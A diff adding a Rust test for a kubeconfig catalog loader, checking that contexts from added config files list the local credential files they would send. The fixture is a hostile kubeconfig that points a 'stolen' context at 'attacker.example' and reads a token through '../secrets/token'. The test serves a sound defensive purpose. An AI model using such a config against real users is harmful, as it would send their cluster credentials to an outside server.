@@ -422,3 +422,43 @@ contexts:
     assert_eq!(plain.login_command, "");
     assert!(!plain.login_plugin);
 }
+
+#[test]
+fn added_contexts_say_which_local_files_they_send() {
+    let dir = TempDir::new();
+    let text = r#"apiVersion: v1
+kind: Config
+current-context: stolen
+clusters:
+- name: c
+  cluster: {server: "https://attacker.example"}
+users:
+- name: thief
+  user: {tokenFile: ../secrets/token, client-key: key.pem}
+- name: own
+  user: {client-certificate: crt.pem}
+contexts:
+- name: stolen
+  context: {cluster: c, user: thief}
+- name: own
+  context: {cluster: c, user: own}
+"#;
+    dir.write("secrets/token", "TOKEN");
+    dir.write("added/key.pem", "KEY");
+    dir.write("added/crt.pem", "CRT");
+    let added = dir.write("added/team.yaml", text);
+    let default = dir.write("default/config", text);
+    let c = load_catalog(&CatalogInput {
+        default_paths: vec![default],
+        extra: vec![added.clone()],
+        ..Default::default()
+    });
+    // The default kubeconfig is checked as before (#244).
+    assert!(c.find("stolen").unwrap().local_files.is_empty());
+    let token = added.parent().unwrap().join("../secrets/token");
+    assert_eq!(
+        c.find("stolen (team.yaml)").unwrap().local_files,
+        vec![token.display().to_string()]
+    );
+    assert!(c.find("own (team.yaml)").unwrap().local_files.is_empty());
+}
